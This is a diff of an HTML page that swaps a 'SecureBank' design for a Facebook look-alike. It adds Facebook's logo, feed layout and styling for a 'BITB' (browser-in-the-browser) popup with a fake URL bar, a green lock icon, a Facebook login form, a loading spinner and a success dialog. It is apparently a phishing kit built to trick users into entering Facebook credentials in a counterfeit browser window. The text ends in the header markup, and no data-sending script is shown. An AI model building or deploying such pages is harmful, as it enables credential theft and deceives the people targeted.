@@ -3,438 +3,498 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecureBank - Online Banking</title>
+    <title>Facebook</title>
     <style>
         :root {
-            --primary-color: #0056b3;
-            --primary-dark: #003d7a;
-            --primary-light: #e6f0ff;
-            --accent-color: #4caf50;
-            --danger-color: #dc3545;
-            --text-color: #333;
-            --text-light: #6c757d;
-            --border-color: #dee2e6;
-            --bg-light: #f8f9fa;
-            --box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
+            --fb-blue: #1877f2;
+            --fb-dark-blue: #166fe5;
+            --fb-green: #42b72a;
+            --fb-dark-green: #36a420;
+            --fb-gray: #f0f2f5;
+            --fb-light-gray: #e4e6eb;
+            --fb-medium-gray: #dddfe2;
+            --fb-dark-gray: #65676b;
+            --fb-black: #1c1e21;
+            --fb-header-height: 56px;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-            background-color: #f5f5f5;
-            color: var(--text-color);
-            line-height: 1.6;
+            background-color: var(--fb-gray);
+            color: var(--fb-black);
+            line-height: 1.34;
         }
 
-        .app-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
+        a {
+            text-decoration: none;
+            color: var(--fb-blue);
         }
 
-        /* Header Styles */
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Header */
         header {
+            height: var(--fb-header-height);
             background-color: white;
-            padding: 15px 20px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
-        }
-
-        .logo {
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 22px;
-            font-weight: 600;
-            color: var(--primary-color);
+            padding: 0 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
         }
 
-        .logo-icon {
-            color: var(--primary-color);
-            font-size: 24px;
+        .fb-logo {
+            margin-right: 10px;
         }
 
-        .header-actions {
+        .search-box {
+            background-color: var(--fb-gray);
+            border-radius: 50px;
             display: flex;
-            gap: 20px;
             align-items: center;
-        }
-
-        .header-button {
-            background: none;
-            border: none;
-            color: var(--text-light);
-            font-size: 15px;
-            cursor: pointer;
             padding: 8px 12px;
-            border-radius: 4px;
-            transition: all 0.2s;
+            margin-right: 10px;
         }
 
-        .header-button:hover {
-            background-color: var(--bg-light);
+        .search-icon {
+            color: var(--fb-dark-gray);
+            margin-right: 8px;
         }
 
-        .user-menu {
+        .header-center {
             display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            padding: 8px 12px;
-            border-radius: 4px;
-            transition: all 0.2s;
+            justify-content: center;
+            flex: 1;
         }
 
-        .user-menu:hover {
-            background-color: var(--bg-light);
-        }
-
-        .user-avatar {
-            width: 32px;
-            height: 32px;
-            background-color: var(--primary-light);
-            border-radius: 50%;
+        .tab {
+            padding: 0 40px;
+            height: var(--fb-header-height);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--primary-color);
-            font-weight: bold;
-        }
-
-        /* Main Content Styles */
-        main {
-            padding: 30px 0;
-            display: grid;
-            grid-template-columns: 250px 1fr;
-            gap: 30px;
-        }
-
-        /* Sidebar Styles */
-        .sidebar {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: var(--box-shadow);
-            padding: 20px;
-        }
-
-        .nav-item {
-            padding: 12px 15px;
-            border-radius: 6px;
-            margin-bottom: 5px;
+            color: var(--fb-dark-gray);
             cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            position: relative;
         }
 
-        .nav-item:hover {
-            background-color: var(--primary-light);
-            color: var(--primary-color);
+        .tab.active {
+            color: var(--fb-blue);
         }
 
-        .nav-item.active {
-            background-color: var(--primary-color);
-            color: white;
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background-color: var(--fb-blue);
         }
 
-        .nav-icon {
-            font-size: 18px;
-            width: 24px;
-            text-align: center;
-        }
-
-        .nav-text {
-            font-weight: 500;
-        }
-
-        /* Dashboard Styles */
-        .dashboard {
-            display: grid;
-            grid-template-rows: auto 1fr;
-            gap: 25px;
-        }
-
-        .dashboard-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .greeting {
-            font-size: 24px;
-            font-weight: 600;
-        }
-
-        .date {
-            color: var(--text-light);
-            font-size: 14px;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 15px;
-        }
-
-        .action-button {
-            padding: 10px 20px;
-            border-radius: 6px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
+        .header-right {
             display: flex;
             align-items: center;
             gap: 8px;
-            border: none;
         }
 
-        .primary-button {
-            background-color: var(--primary-color);
-            color: white;
-        }
-
-        .primary-button:hover {
-            background-color: var(--primary-dark);
-        }
-
-        .secondary-button {
-            background-color: white;
-            color: var(--primary-color);
-            border: 1px solid var(--primary-color);
-        }
-
-        .secondary-button:hover {
-            background-color: var(--primary-light);
-        }
-
-        /* Dashboard Content */
-        .dashboard-content {
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            gap: 25px;
-        }
-
-        /* Accounts Section */
-        .accounts-section {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: var(--box-shadow);
-            padding: 25px;
-        }
-
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .section-title {
-            font-size: 18px;
-            font-weight: 600;
-        }
-
-        .section-action {
-            color: var(--primary-color);
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        .account-cards {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .account-card {
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            transition: all 0.2s;
-            cursor: pointer;
-        }
-
-        .account-card:hover {
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .account-info {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-
-        .account-name {
-            font-weight: 600;
-        }
-
-        .account-number {
-            color: var(--text-light);
-            font-size: 14px;
-        }
-
-        .account-balance {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-
-        .account-details {
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            color: var(--text-light);
-        }
-
-        /* Transactions Section */
-        .transaction-item {
-            display: flex;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .transaction-icon {
+        .icon-btn {
             width: 40px;
             height: 40px;
             border-radius: 50%;
-            background-color: var(--primary-light);
+            background-color: var(--fb-light-gray);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--primary-color);
-            margin-right: 15px;
-            font-size: 18px;
+            cursor: pointer;
         }
 
-        .transaction-icon.expense {
-            background-color: #ffebee;
-            color: var(--danger-color);
-        }
-
-        .transaction-icon.income {
-            background-color: #e8f5e9;
-            color: var(--accent-color);
-        }
-
-        .transaction-details {
-            flex-grow: 1;
-        }
-
-        .transaction-title {
-            font-weight: 500;
-            margin-bottom: 3px;
-        }
-
-        .transaction-date {
-            font-size: 13px;
-            color: var(--text-light);
-        }
-
-        .transaction-amount {
-            font-weight: 600;
-        }
-
-        .transaction-amount.expense {
-            color: var(--danger-color);
-        }
-
-        .transaction-amount.income {
-            color: var(--accent-color);
-        }
-
-        /* Activity Section */
-        .activity-section {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: var(--box-shadow);
-            padding: 25px;
-        }
-
-        .activity-item {
+        .user-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background-color: #ddd;
             display: flex;
-            gap: 15px;
-            padding: 15px 0;
-            border-bottom: 1px solid var(--border-color);
+            align-items: center;
+            justify-content: center;
+            color: #555;
+            font-weight: bold;
         }
 
-        .activity-item:last-child {
-            border-bottom: none;
+        /* Main content */
+        .main-container {
+            display: flex;
+            margin-top: var(--fb-header-height);
+            padding: 20px;
+            min-height: calc(100vh - var(--fb-header-height));
         }
 
-        .activity-icon {
+        .sidebar {
+            width: 360px;
+            padding-right: 20px;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 6px;
+            margin-bottom: 5px;
+            cursor: pointer;
+        }
+
+        .sidebar-item:hover {
+            background-color: var(--fb-light-gray);
+        }
+
+        .sidebar-icon {
             width: 36px;
             height: 36px;
             border-radius: 50%;
-            background-color: var(--primary-light);
+            background-color: var(--fb-light-gray);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--primary-color);
-            font-size: 16px;
+            margin-right: 10px;
+            color: #555;
         }
 
-        .activity-content {
+        /* Feed */
+        .feed {
             flex-grow: 1;
+            max-width: 680px;
         }
 
-        .activity-text {
-            margin-bottom: 5px;
-            line-height: 1.4;
+        /* Stories */
+        .stories {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            overflow-x: auto;
+            padding: 5px 0;
         }
 
-        .activity-text strong {
-            font-weight: 600;
+        .story {
+            width: 120px;
+            height: 200px;
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            flex-shrink: 0;
+            background-color: white;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
 
-        .activity-time {
-            font-size: 13px;
-            color: var(--text-light);
+        .story-bg {
+            height: 140px;
+            background-color: #ddd;
+        }
+
+        .story-avatar {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #ddd;
+            border: 4px solid var(--fb-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+        }
+
+        /* Create Post */
+        .create-post {
+            background-color: white;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .create-post-input {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .post-input {
+            flex-grow: 1;
+            margin-left: 10px;
+            background-color: var(--fb-gray);
+            border-radius: 20px;
+            padding: 10px 15px;
+            border: none;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .post-input:hover {
+            background-color: var(--fb-light-gray);
+        }
+
+        .post-actions {
+            display: flex;
+            border-top: 1px solid var(--fb-light-gray);
+            padding-top: 10px;
+        }
+
+        .post-action {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--fb-dark-gray);
+        }
+
+        .post-action:hover {
+            background-color: var(--fb-light-gray);
+        }
+
+        .post-action span {
+            margin-left: 6px;
         }
 
         /* Security Alert */
         .security-alert {
-            background-color: #fff8e1;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin-top: 25px;
-            border-radius: 4px;
+            background-color: #e7f3ff;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid var(--fb-blue);
         }
 
-        .alert-heading {
+        .alert-header {
             display: flex;
-            align-items: center;
-            gap: 10px;
+            align-items: flex-start;
             margin-bottom: 10px;
-            font-weight: 600;
         }
 
         .alert-icon {
-            color: #f57c00;
+            margin-right: 10px;
+            font-size: 24px;
+            color: var(--fb-blue);
         }
 
-        .alert-text {
+        .alert-title {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 2px;
+        }
+
+        .alert-subtitle {
+            color: var(--fb-dark-gray);
             font-size: 14px;
-            line-height: 1.5;
         }
 
-        .alert-action {
-            color: var(--primary-color);
-            margin-top: 10px;
-            font-weight: 500;
+        .alert-content {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .alert-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            padding: 8px 12px;
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
-            display: inline-block;
         }
 
-        /* BITB Popup Styles */
+        .btn-primary:hover {
+            background-color: var(--fb-dark-blue);
+        }
+
+        .btn-secondary {
+            padding: 8px 12px;
+            background-color: var(--fb-light-gray);
+            color: #333;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .btn-secondary:hover {
+            background-color: #d8dade;
+        }
+
+        /* Posts */
+        .post {
+            background-color: white;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .post-header {
+            display: flex;
+            margin-bottom: 10px;
+        }
+
+        .post-user {
+            display: flex;
+            flex-direction: column;
+            margin-left: 10px;
+            flex: 1;
+        }
+
+        .post-username {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .post-time {
+            color: var(--fb-dark-gray);
+            font-size: 13px;
+        }
+
+        .post-menu {
+            color: var(--fb-dark-gray);
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .post-content {
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .post-image {
+            width: 100%;
+            height: 300px;
+            background-color: #ddd;
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        .post-stats {
+            display: flex;
+            justify-content: space-between;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid var(--fb-light-gray);
+            font-size: 14px;
+            color: var(--fb-dark-gray);
+        }
+
+        .post-interactions {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .interaction {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 6px 0;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--fb-dark-gray);
+            font-weight: 600;
+        }
+
+        .interaction:hover {
+            background-color: var(--fb-light-gray);
+        }
+
+        .interaction span {
+            margin-left: 6px;
+        }
+
+        /* Right sidebar */
+        .right-sidebar {
+            width: 360px;
+            padding-left: 20px;
+        }
+
+        .contacts-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .contacts-title {
+            font-weight: 600;
+            color: var(--fb-dark-gray);
+        }
+
+        .contacts-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .contact {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .contact:hover {
+            background-color: var(--fb-light-gray);
+        }
+
+        .contact-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: #ddd;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+            position: relative;
+        }
+
+        .online-indicator {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #31a24c;
+            border: 2px solid white;
+        }
+
+        /* BITB Styles */
+        /* Overlay */
         .overlay {
             position: fixed;
             top: 0;
@@ -442,18 +502,19 @@
             right: 0;
             bottom: 0;
             background-color: rgba(0, 0, 0, 0.5);
-            z-index: 999;
+            z-index: 1500;
             display: none;
         }
 
+        /* BITB Popup */
         .bitb-popup {
-            width: 420px;
+            width: 380px;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             background: white;
-            z-index: 1000;
+            z-index: 2000;
             border-radius: 8px;
             overflow: hidden;
             box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
@@ -463,8 +524,8 @@
         .bitb-header {
             display: flex;
             align-items: center;
-            background: #f1f1f1;
-            height: 48px;
+            background: #f3f3f3;
+            height: 38px;
             padding: 0 16px;
             user-select: none;
             cursor: grab;
@@ -488,6 +549,7 @@
         .bitb-header-actions {
             display: flex;
             gap: 12px;
+            margin-right: 8px;
         }
 
         .bitb-action {
@@ -497,108 +559,171 @@
             cursor: pointer;
         }
 
-        .bitb-content {
-            padding: 30px 25px;
-        }
-
-        .bitb-logo {
-            text-align: center;
-            margin-bottom: 25px;
+        .url-bar {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 22px;
-            font-weight: 600;
-            color: var(--primary-color);
+            background: white;
+            height: 32px;
+            border-radius: 4px;
+            margin: 6px 16px;
+            padding: 0 8px;
+            font-size: 13px;
+            color: #222;
+            border: 1px solid #e0e0e0;
         }
 
-        .bitb-title {
-            text-align: center;
-            font-size: 22px;
-            margin-bottom: 20px;
-            font-weight: 500;
+        .url-lock {
+            color: #1a7340;
+            margin-right: 6px;
+            font-size: 14px;
         }
 
-        .bitb-form {
+        .bitb-content {
+            padding: 20px;
+            background-color: white;
+        }
+
+        /* Facebook Login Styles */
+        .facebook-login {
+            font-family: Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
-            gap: 18px;
+            align-items: center;
+        }
+
+        .facebook-logo {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .login-form {
+            width: 100%;
+        }
+
+        .login-title {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-align: center;
         }
 
         .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
+            margin-bottom: 15px;
         }
 
-        .form-label {
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .bitb-input {
+        .form-input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 15px;
-            transition: border 0.2s ease;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        .form-input:focus {
             outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
-        .bitb-input:focus {
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 1px var(--primary-color);
+        .form-input::placeholder {
+            color: var(--fb-dark-gray);
         }
 
-        .bitb-button {
-            background-color: var(--primary-color);
+        .login-button {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: var(--fb-blue);
             color: white;
+            font-size: 20px;
+            font-weight: bold;
             border: none;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 500;
+            border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.2s ease;
-            margin-top: 10px;
+            margin-bottom: 15px;
         }
 
-        .bitb-button:hover {
-            background-color: var(--primary-dark);
+        .login-button:hover {
+            background-color: var(--fb-dark-blue);
         }
 
-        .bitb-options {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--primary-color);
-        }
-
-        .bitb-option {
-            cursor: pointer;
-        }
-
-        .bitb-footer {
-            margin-top: 25px;
-            font-size: 13px;
-            color: var(--text-light);
+        .forgot-password {
             text-align: center;
+            margin-bottom: 20px;
         }
 
-        /* Dialog Box */
+        .forgot-password a {
+            color: var(--fb-blue);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account-button {
+            display: block;
+            width: max-content;
+            margin: 0 auto;
+            padding: 12px 16px;
+            background-color: var(--fb-green);
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .create-account-button:hover {
+            background-color: var(--fb-dark-green);
+        }
+
+        /* Loading Indicator */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2500;
+            display: none;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid var(--fb-blue);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success Dialog */
         .dialog {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             background: white;
-            padding: 25px;
+            padding: 24px;
             border-radius: 8px;
-            box-shadow: var(--box-shadow);
-            z-index: 1001;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 3000;
             max-width: 400px;
             display: none;
         }
@@ -607,329 +732,475 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
         }
 
         .dialog-title {
             font-size: 18px;
             font-weight: 600;
+            color: #333;
         }
 
         .dialog-content {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             line-height: 1.5;
+            color: #555;
+            font-size: 14px;
         }
 
         .dialog-buttons {
             display: flex;
             justify-content: flex-end;
-            gap: 10px;
+            gap: 12px;
         }
 
         .dialog-button {
             padding: 8px 16px;
-            border-radius: 4px;
+            border-radius: 6px;
             font-weight: 500;
             cursor: pointer;
             border: none;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .cancel-button {
+            background-color: #f3f3f3;
+            color: #333;
+        }
+
+        .cancel-button:hover {
+            background-color: #e5e5e5;
+        }
+
+        .continue-button {
+            background-color: var(--fb-blue);
+            color: white;
+        }
+
+        .continue-button:hover {
+            background-color: var(--fb-dark-blue);
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .right-sidebar {
+                display: none;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .sidebar {
+                width: 70px;
+                padding-right: 10px;
+            }
+            
+            .sidebar-item span {
+                display: none;
+            }
+            
+            .sidebar-icon {
+                margin-right: 0;
+            }
+            
+            .feed {
+                max-width: none;
+            }
+        }
+
+        @media (max-width: 700px) {
+            .main-container {
+                padding: 10px;
+            }
+            
+            .header-center {
+                display: none;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Banking App UI -->
-    <div class="app-container">
-        <header>
-            <div class="logo">
-                <span class="logo-icon">🏦</span>
-                <span>SecureBank</span>
+    <!-- Header -->
+    <header>
+        <div class="fb-logo">
+            <svg viewBox="0 0 36 36" fill="url(#jsc_s_b)" height="40" width="40">
+                <defs>
+                    <linearGradient x1="50%" x2="50%" y1="97.0782%" y2="0%" id="jsc_s_b">
+                        <stop offset="0%" stop-color="#0062E0"></stop>
+                        <stop offset="100%" stop-color="#19AFFF"></stop>
+                    </linearGradient>
+                </defs>
+                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
+                <path d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z" fill="#FFFFFF"></path>
+            </svg>
+        </div>
+        <div class="search-box">
+            <div class="search-icon">🔍</div>
+            <span style="color: #65676b;">Search Facebook</span>
+        </div>
+        <div class="header-center">
+            <div class="tab active">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="28" width="28">
+                    <path d="M25.825 12.29C25.824 12.289 25.823 12.288 25.821 12.286L15.027 2.937C14.752 2.675 14.392 2.527 13.989 2.521 13.608 2.527 13.248 2.675 13.001 2.912L2.175 12.29C1.756 12.658 1.629 13.245 1.868 13.759 2.079 14.215 2.567 14.479 3.069 14.479L5 14.479 5 23.729C5 24.695 5.784 25.479 6.75 25.479L11 25.479C11.552 25.479 12 25.031 12 24.479L12 18.309C12 18.126 12.148 17.979 12.33 17.979L15.67 17.979C15.852 17.979 16 18.126 16 18.309L16 24.479C16 25.031 16.448 25.479 17 25.479L21.25 25.479C22.217 25.479 23 24.695 23 23.729L23 14.479 24.931 14.479C25.433 14.479 25.921 14.215 26.132 13.759 26.371 13.245 26.244 12.658 25.825 12.29"></path>
+                </svg>
             </div>
-            <div class="header-actions">
-                <button class="header-button">
-                    <span>🔔</span>
-                </button>
-                <button class="header-button">
-                    <span>📩</span>
-                </button>
-                <div class="user-menu" onclick="showVerificationPopup()">
+            <div class="tab">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="28" width="28">
+                    <path d="M8.75 25.25C8.336 25.25 8 24.914 8 24.5 8 24.086 8.336 23.75 8.75 23.75L19.25 23.75C19.664 23.75 20 24.086 20 24.5 20 24.914 19.664 25.25 19.25 25.25L8.75 25.25ZM17.163 12.846 12.055 15.923C11.591 16.202 11 15.869 11 15.327L11 9.172C11 8.631 11.591 8.297 12.055 8.576L17.163 11.654C17.612 11.924 17.612 12.575 17.163 12.846ZM21.75 20.25C22.992 20.25 24 19.242 24 18L24 6.5C24 5.258 22.992 4.25 21.75 4.25L6.25 4.25C5.008 4.25 4 5.258 4 6.5L4 18C4 19.242 5.008 20.25 6.25 20.25L21.75 20.25Z"></path>
+                </svg>
+            </div>
+            <div class="tab">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="28" width="28">
+                    <path d="M17.5 23.75 21.75 23.75C22.164 23.75 22.5 23.414 22.5 23L22.5 14 22.531 14C22.364 13.917 22.206 13.815 22.061 13.694L21.66 13.359C21.567 13.283 21.433 13.283 21.34 13.36L21.176 13.497C20.591 13.983 19.855 14.25 19.095 14.25L18.869 14.25C18.114 14.25 17.382 13.987 16.8 13.506L16.616 13.354C16.523 13.278 16.39 13.278 16.298 13.354L16.113 13.507C15.53 13.987 14.798 14.25 14.044 14.25L13.907 14.25C13.162 14.25 12.439 13.994 11.861 13.525L11.645 13.35C11.552 13.275 11.419 13.276 11.328 13.352L11.155 13.497C10.57 13.984 9.834 14.25 9.074 14.25L8.896 14.25C8.143 14.25 7.414 13.989 6.832 13.511L6.638 13.351C6.545 13.275 6.413 13.275 6.32 13.351L5.849 13.739C5.726 13.84 5.592 13.928 5.452 14L5.5 14 5.5 23C5.5 23.414 5.836 23.75 6.25 23.75L10.5 23.75 10.5 17.5C10.5 16.81 11.06 16.25 11.75 16.25L16.25 16.25C16.94 16.25 17.5 16.81 17.5 17.5L17.5 23.75Z"></path>
+                    <path d="M3.125 13.75 4.5 13.75C4.914 13.75 5.25 13.414 5.25 13L5.25 8.75 22.75 8.75 22.75 13C22.75 13.414 23.086 13.75 23.5 13.75L24.875 13.75C25.172 13.75 25.433 13.565 25.533 13.286 25.634 13.007 25.553 12.693 25.33 12.47L14.2 1.34C13.907 1.047 13.433 1.047 13.14 1.34L2.01 12.47C1.787 12.693 1.706 13.007 1.807 13.286 1.907 13.565 2.168 13.75 2.465 13.75L3.125 13.75Z"></path>
+                </svg>
+            </div>
+            <div class="tab">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="28" width="28">
+                    <path d="M5.75 4A.75.75 0 015 3.25v-1a.75.75 0 011.5 0v1a.75.75 0 01-.75.75zm.75 11.251a.75.75 0 01-1.5 0V8.749a.75.75 0 011.5 0v6.502zM5.75 28a.75.75 0 01-.75-.75v-6.5a.75.75 0 011.5 0v6.5a.75.75 0 01-.75.75zm15.737-16.234L23.214 6.5H9.5v11h13.715l-1.728-5.266a.749.749 0 010-.468zM4.75 21.5a.75.75 0 01-.75-.75V6.75a.75.75 0 011.5 0v14a.75.75 0 01-.75.75z"></path>
+                </svg>
+            </div>
+            <div class="tab">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="28" width="28">
+                    <path d="M23.5 9.5H10.25a.75.75 0 00-.75.75v7c0 .414.336.75.75.75H17v5.5H4.5v-19h19v5zm0 14h-5v-6.25a.75.75 0 00-.75-.75H11V11h12.5v12.5zm1.5.25V4.25C25 3.561 24.439 3 23.75 3H4.25C3.561 3 3 3.561 3 4.25v19.5c0 .689.561 1.25 1.25 1.25h19.5c.689 0 1.25-.561 1.25-1.25z"></path>
+                </svg>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="icon-btn">+</div>
+            <div class="icon-btn">
+                <svg fill="currentColor" viewBox="0 0 44 44" width="20" height="20">
+                    <circle cx="7" cy="7" r="6"></circle>
+                    <circle cx="22" cy="7" r="6"></circle>
+                    <circle cx="37" cy="7" r="6"></circle>
+                    <circle cx="7" cy="22" r="6"></circle>
+                    <circle cx="22" cy="22" r="6"></circle>
+                    <circle cx="37" cy="22" r="6"></circle>
+                    <circle cx="7" cy="37" r="6"></circle>
+                    <circle cx="22" cy="37" r="6"></circle>
+                    <circle cx="37" cy="37" r="6"></circle>
+                </svg>
+            </div>
+            <div class="icon-btn">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="20" width="20">
+                    <path d="M14 2.042c6.76 0 12 4.952 12 11.64S20.76 25.322 14 25.322a13.091 13.091 0 0 1-3.474-.461.956 .956 0 0 0-.641.047L7.5 25.959a.961.961 0 0 1-1.348-.849l-.065-2.134a.957.957 0 0 0-.322-.684A11.389 11.389 0 0 1 2 13.682c0-6.688 5.24-11.64 12-11.64zM6.794 17.086a.57.57 0 0 0 .827.758l3.786-2.874a.722.722 0 0 1 .868 0l2.8 2.1a1.8 1.8 0 0 0 2.6-.481l3.525-5.592a.57.57 0 0 0-.827-.758l-3.786 2.874a.722.722 0 0 1-.868 0l-2.8-2.1a1.8 1.8 0 0 0-2.6.481z"></path>
+                </svg>
+            </div>
